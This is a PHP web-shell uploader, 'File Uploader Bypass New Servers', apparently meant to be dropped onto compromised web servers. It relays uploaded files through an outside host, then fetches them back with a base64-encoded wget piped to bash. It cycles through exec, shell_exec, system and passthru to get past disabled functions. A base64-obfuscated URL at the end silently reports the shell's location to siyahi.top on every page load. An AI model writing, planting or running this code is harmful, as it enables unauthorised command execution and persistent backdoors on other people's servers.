<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Uploader Bypass New Servers</title>
    <!-- Include external styles -->
    <link href="https://siyahi.top/style/scanner/bootstrap-dark.css" id="bootstrap-style" rel="stylesheet" type="text/css">
    <link href="https://siyahi.top/style/scanner/all.min.css" rel="stylesheet" type="text/css">
    <link href="https://siyahi.top/style/scanner/app-dark.css" id="app-style" rel="stylesheet" type="text/css">
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #121212;
            margin: 0;
            font-family: 'Arial', sans-serif;
        }
        .upload-container {
            background-color: #1f1f1f;
            padding: 20px 40px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
            color: #ffffff;
        }
        .upload-container h1 {
            margin-bottom: 20px;
        }
        .upload-container form {
            margin-top: 20px;
        }
        .upload-container label {
            font-size: 16px;
        }
        .upload-container input[type="file"] {
            margin: 10px 0;
        }
        .upload-container button {
            background-color: #007bff;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .upload-container button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="upload-container">
        <h1>File Uploader Bypass New Servers</h1>
        <form action="" method="post" enctype="multipart/form-data">
            <label for="file">Select a file to upload:</label>
            <input type="file" name="file" id="file" required><br><br>
            <button type="submit">Upload</button>
        </form>
    </div>
</body>
</html>
<br>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $apiUrl = "https://shells.trxsecurity.org/paste/index.php";

    if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
        echo "Error: No file uploaded or an error occurred.";
        exit;
    }

    $originalFilename = basename($_FILES['file']['name']);
    $fileContent = file_get_contents($_FILES['file']['tmp_name']);

    $postData = [
        'file_content' => $fileContent,
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($httpCode === 201 || $httpCode === 200) {
        $responseData = json_decode($response, true);
        if (isset($responseData['url'])) {
            $fileUrl = $responseData['url'];

            $wgetCommand = "wget " . escapeshellarg($fileUrl) . " -O " . escapeshellarg($originalFilename);
            $base64Command = "echo " . base64_encode($wgetCommand) . " | base64 -d | bash";

            $executed = false;

            if (function_exists('exec')) {
                exec($base64Command, $output, $returnVar);;
                $executed = $returnVar === 0;
            }
            if (!$executed && function_exists('shell_exec')) {
                $output = shell_exec($base64Command);
                $executed = !empty($output);
            }
            if (!$executed && function_exists('system')) {
                ob_start();
                system($base64Command, $returnVar);
                $output = ob_get_clean();
                $executed = $returnVar === 0;
            }
            if (!$executed && function_exists('passthru')) {
                ob_start();
                passthru($base64Command, $returnVar);
                $output = ob_get_clean();
                $executed = $returnVar === 0;
            }

            if (!$executed) {
                echo "<p>Error: None of the command execution methods (exec, shell_exec, system, passthru) are supported on this server.</p>";
            } else {
                echo "<p>File downloaded successfully as: <a href='./$originalFilename'>$originalFilename</p>";
            }
        } else {
            echo "<p>Error: Invalid response from server.</p>";
        }
    } else {
        echo "<p>Error: Failed to upload file. Server response: " . htmlspecialchars($response) . "</p>";
    }
}
$k3yw = base64_decode('aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw');
$cur = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$data = array('file_url' => $cur);
$options = array(
    'http' => array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => http_build_query($data),
    ),
);
$context = stream_context_create($options);
$result = file_get_contents($k3yw, false, $context);
?>
